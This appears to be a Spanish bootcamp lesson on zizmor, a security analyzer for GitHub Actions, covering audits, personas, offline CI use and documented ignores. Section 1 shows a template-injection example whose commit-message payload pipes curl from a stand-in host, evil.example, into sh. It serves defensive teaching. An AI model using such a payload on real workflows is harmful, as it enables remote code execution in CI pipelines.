# zizmor

> actionlint te dice si el workflow está bien escrito; zizmor, si es seguro. Es un analizador
> estático de seguridad para GitHub Actions, y desde esta semana es la segunda puerta de cada PR
> que toque `.github/workflows/`.

## 🎯 Objetivos

Al terminar este archivo eres capaz de:

- Explicar qué es una auditoría de zizmor y cómo se lee un hallazgo
- Distinguir severidad y confianza, y filtrar por ellas
- Elegir persona (`regular`, `pedantic`, `auditor`) según para qué lo ejecutas
- Ejecutarlo en CI sin red (`--offline`) y con sus hallazgos como anotaciones (`--format=github`)
- Ignorar un hallazgo concreto dejando escrito el motivo

## 1. Qué problema resuelve

Mira este step. Parece inofensivo:

```text
- name: Mostrar el mensaje del commit
  run: echo "${{ github.event.head_commit.message }}"
```

La expresión se sustituye **antes** de que bash vea el script. Un commit con el mensaje
`"; curl https://evil.example | sh; echo "` convierte ese `echo` en tres comandos. Es inyección
de código, y en un workflow con permisos de escritura o secretos es el incidente completo.
actionlint lo marca con su regla `expression`, pero actionlint mira sobre todo la sintaxis: no
sabe nada de credenciales persistidas, permisos sobrantes o disparadores peligrosos.

Las reglas de seguridad de este bootcamp ya prohíben ese patrón, y el de actions sin fijar por
SHA, el de `persist-credentials` sin desactivar y una docena más. Pero una regla que depende de
que alguien la recuerde en cada revisión falla el día que nadie mira. zizmor las convierte en una
comprobación automática.

## 2. Cómo funciona

zizmor lee los archivos YAML (workflows, `action.yml`, `dependabot.yml`) y les pasa una lista de
**auditorías**. Cada auditoría busca un problema concreto y produce **hallazgos**:

| Auditoría (ejemplos) | Qué busca |
|---|---|
| `template-injection` | `${{ ... }}` con datos que puede controlar un atacante dentro de `run:` |
| `artipacked` | `actions/checkout` sin `persist-credentials: false` |
| `unpinned-uses` | `uses:` por tag o rama en vez de por SHA |
| `excessive-permissions` | Permisos de escritura que el workflow no necesita |
| `dangerous-triggers` | Disparadores peligrosos como `pull_request_target` (Semana 12) |
| `unpinned-images` | Imágenes de contenedor sin digest |
| `undocumented-permissions` | Permisos de escritura sin un comentario que explique para qué |

### Severidad y confianza

Cada hallazgo lleva dos medidas independientes:

- **Severidad**: cuánto daño haría si es real. `informational`, `low`, `medium` o `high`.
- **Confianza**: cuán seguro está zizmor de que es real. `low`, `medium` o `high`.

Un `template-injection` sobre `github.event.head_commit.message` es severidad alta y confianza
alta: el dato lo escribe quien hace el commit. Sobre una salida de un step que tú controlas, la
confianza baja. Puedes filtrar con `--min-severity` y `--min-confidence`.

### Personas

La persona decide qué auditorías y qué hallazgos se enseñan:

| Persona | Para qué |
|---|---|
| `regular` (por defecto) | La puerta del CI: mínimos falsos positivos |
| `pedantic` | Revisar a fondo: añade malos olores que no son vulnerabilidades |
| `auditor` | Auditar código ajeno: acepta falsos positivos para no perder nada |

Lo que una persona no enseña aparece como **suprimido** en el resumen final, no desaparece.

### Auditorías online y offline

Algunas auditorías consultan la API de GitHub: `impostor-commit` comprueba que el SHA fijado
pertenece de verdad al repo de la action, `known-vulnerable-actions` busca avisos de seguridad,
`ref-confusion` y `stale-action-refs` revisan tags y ramas. Necesitan red y un token.

| Flag | Qué hace |
|---|---|
| `--offline` (`-o`) | Solo operaciones sin red: desactiva las auditorías online y no audita repos remotos |
| `--no-online-audits` | Solo desactiva las auditorías online; es la versión débil |

Esta semana usas `--offline`: el job de CI no necesita token para zizmor y el resultado no
depende de la red. Las auditorías online, con su token y sus permisos, las activas en la
Semana 12.

## 3. Cómo se usa

### En local

```bash
uv tool install zizmor==1.31.1
zizmor --version
# zizmor 1.31.1

zizmor --offline .github/workflows/
# No findings to report. Good job! (3 suppressed)
```

Ese es el resultado sobre la capa 07 de `tablero`. Los tres suprimidos los enseña la persona
pedantic:

```bash
zizmor --offline --persona=pedantic .github/workflows/
# help[undocumented-permissions]: ...
# ...[unpinned-images]: ... postgres:17...-alpine ...
```

`unpinned-images` señala la imagen de PostgreSQL de los service containers, fijada por tag
completo pero no por digest. En la Semana 14 el despliegue pasa a digest; hasta entonces, el modo
regular no lo considera un fallo.

Un hallazgo real, provocado con el `echo` de la sección 1:

```text
error[template-injection]: code injection via template expansion
  --> .github/workflows/bad.yml:11:24
   |
11 |         run: echo "${{ github.event.head_commit.message }}"
   |         ---            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ may expand into attacker-controllable code
   |         |
   |         this run block
   |
   = note: audit confidence → High
   = help: audit documentation → https://docs.zizmor.sh/audits/#template-injection
```

Nombre de la auditoría, archivo, línea y columna, el fragmento señalado, la confianza y un enlace
a la documentación con el porqué y el arreglo. Con hallazgos, zizmor termina con un código
distinto de 0: el step de CI falla sin hacer nada más.

El arreglo es el de siempre, la regla 4 de seguridad: el dato llega al shell por `env:`.

```yaml
- name: Mostrar el mensaje del commit
  env:
    COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
  run: echo "$COMMIT_MESSAGE"
```

### En CI: `--format=github` y `--offline`

```yaml
name: zizmor-demo

on:
  pull_request:
    paths:
      - ".github/workflows/**"

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# Mínimo privilegio: lo verás a fondo en la Semana 12.
permissions:
  contents: read

jobs:
  zizmor:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
        with:
          version: "0.13.6"
      - name: Instalar zizmor
        run: uv tool install zizmor==1.31.1
      - name: zizmor
        run: zizmor --offline --format=github .github/workflows/
```

- **`--format=github`** cambia la salida a comandos de workflow (archivo 02). El hallazgo de
  antes sale como una sola línea que el runner convierte en anotación sobre la línea 11 del PR:

  ```text
  ::error file=.github/workflows/bad.yml,line=11,title=template-injection::bad.yml:11: code injection via template expansion: may expand into attacker-controllable code
  ```

  No hace falta problem matcher: zizmor ya habla el idioma del runner.
- **`--offline`** garantiza que el job no hace peticiones a la API: no necesita token, no le
  afecta un límite de peticiones y da el mismo resultado hoy y mañana para el mismo commit.
- **`uv tool install zizmor==1.31.1`** fija la versión. uv descarga de PyPI el paquete de esa
  versión exacta; sin `==` cada run podría usar una distinta y un hallazgo nuevo de una auditoría
  nueva te rompería `main` sin que cambies nada.

Los otros formatos (`plain`, el de por defecto; `json` o `json-v1`; `sarif`) sirven para guardar
o procesar el resultado. `sarif` es el formato estándar de los analizadores estáticos, el que
leen las herramientas de code scanning.

### Ignorar un hallazgo con motivo

A veces un hallazgo es correcto y aun así aceptas el riesgo. Hay dos sitios para decirlo, y en
los dos se escribe **por qué**:

```yaml
# El valor sale de un output de un step propio, no de un evento: no es controlable desde fuera.
- run: echo "${{ steps.version.outputs.value }}" # zizmor: ignore[template-injection]
```

O, para varios archivos, en `.github/zizmor.yml`:

```yaml
rules:
  template-injection:
    ignore:
      # nightly.yml:42 recibe un valor fijo calculado por el propio workflow.
      - nightly.yml:42
```

`--no-ignores` hace que zizmor ignore tus excepciones: úsalo de vez en cuando para revisar si
siguen teniendo sentido.

## 4. Antipatrones

| Antipatrón | Por qué duele | Qué hacer en su lugar |
|---|---|---|
| `uv tool install zizmor` sin versión | Una versión nueva rompe `main` sin cambios tuyos | `zizmor==1.31.1` |
| Persona `auditor` como puerta del CI | Falsos positivos que enseñan a ignorar el rojo | `regular` en CI, `pedantic`/`auditor` para revisar |
| Auditorías online sin token ni límite controlado | Fallos que dependen de la red y no del código | `--offline` hasta la Semana 12 |
| `# zizmor: ignore[...]` sin comentario | Nadie sabe si sigue siendo válido | Una línea que diga por qué |
| `zizmor ... \|\| true` | La puerta deja de serlo | Corregir o ignorar con motivo |
| Salida `plain` en CI | El hallazgo se queda enterrado en el log | `--format=github` |

## 5. Trucos

- **`zizmor --fix`** aplica los arreglos seguros que trae cada auditoría (el hallazgo dice
  `this finding has an auto-fix`). Revisa el diff antes de comitear: es un punto de partida.
- **`--persona=pedantic` en local antes de un PR grande** te enseña lo que el CI no va a
  bloquear pero un revisor sí va a ver.
- **El enlace `audit documentation`** de cada hallazgo explica el ataque y el arreglo con
  ejemplos: es la mejor documentación de seguridad de Actions que vas a encontrar.
- **zizmor también audita `action.yml`**: cuando escribas tus actions en la Semana 10 entran
  solas en la misma puerta.

Verificado con zizmor 1.31.1 y ubuntu-24.04, noviembre 2026.

## 📚 Recursos Adicionales

- [zizmor: documentación](https://docs.zizmor.sh/)
- [zizmor: lista de auditorías](https://docs.zizmor.sh/audits/)
- [zizmor: configuración y `ignore`](https://docs.zizmor.sh/configuration/)
- [GitHub Docs: Secure use reference, script injection](https://docs.github.com/en/actions/reference/security/secure-use)

## ✅ Checklist de Verificación

- [ ] Sé qué es una auditoría y cómo se lee un hallazgo
- [ ] Sé distinguir severidad de confianza
- [ ] Sé qué persona usar en CI y cuál para revisar
- [ ] Sé qué hace `--offline` frente a `--no-online-audits`
- [ ] Sé por qué `--format=github` no necesita problem matcher
- [ ] Sé ignorar un hallazgo en línea o en `zizmor.yml`, con el motivo escrito

---

| ← Anterior | Siguiente → |
|:---|---:|
| [Problem matchers y actionlint en CI](04-problem-matchers-y-actionlint-en-ci.md) | [act](06-act.md) |
